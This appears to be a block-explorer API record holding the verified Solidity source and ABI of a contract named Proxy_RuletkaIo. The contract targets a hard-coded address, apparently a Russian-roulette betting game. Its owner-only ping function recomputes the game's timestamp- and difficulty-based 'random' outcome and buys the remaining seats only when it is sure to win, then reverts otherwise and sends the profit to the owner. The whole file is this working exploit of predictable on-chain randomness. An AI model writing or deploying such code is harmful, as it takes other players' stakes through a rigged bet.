{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.0;\r\n\r\ninterface TargetInterface {\r\n  function getRoom(uint256 _roomId) external view returns (string memory name, address[] memory players, uint256 entryPrice, uint256 balance);\r\n  function enter(uint256 _roomId) external payable;\r\n}\r\n\r\ncontract Proxy_RuletkaIo {\r\n\r\n    address payable private targetAddress = 0xEf02C45C5913629Dd12e7a9446455049775EEC32;\r\n    address payable private owner;\r\n\r\n    constructor() public payable {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n    function ping(uint256 _roomId, bool _keepBalance) public payable onlyOwner {\r\n        TargetInterface target = TargetInterface(targetAddress);\r\n\r\n        address[] memory players;\r\n        uint256 entryPrice;\r\n\r\n        (, players, entryPrice,) = target.getRoom(_roomId);\r\n\r\n        uint256 playersLength = players.length;\r\n        \r\n        require(playersLength > 0 && playersLength < 6);\r\n        require(uint256(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty))) % 6) < playersLength);\r\n        \r\n        uint256 stepCount = 6 - playersLength;\r\n        uint256 ourBalanceInitial = address(this).balance;\r\n        \r\n        for (uint256 i = 0; i < stepCount; i++) {\r\n            target.enter.value(entryPrice)(_roomId);\r\n        }\r\n\r\n        require(address(this).balance > ourBalanceInitial);\r\n        \r\n        if (!_keepBalance) {\r\n            owner.transfer(address(this).balance);\r\n        }\r\n    }\r\n\r\n    function withdraw() public onlyOwner {\r\n        owner.transfer(address(this).balance);\r\n    }\r\n\r\n    function kill() public onlyOwner {\r\n        selfdestruct(owner);\r\n    }\r\n\r\n    function() external payable {\r\n    }\r\n\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_roomId\",\"type\":\"uint256\"},{\"name\":\"_keepBalance\",\"type\":\"bool\"}],\"name\":\"ping\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"Proxy_RuletkaIo","CompilerVersion":"v0.5.2+commit.1df8f40c","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://e7bc737b19625fd0a5649a3621c26a36f33ebbe240363f387d82b56810892300"}]}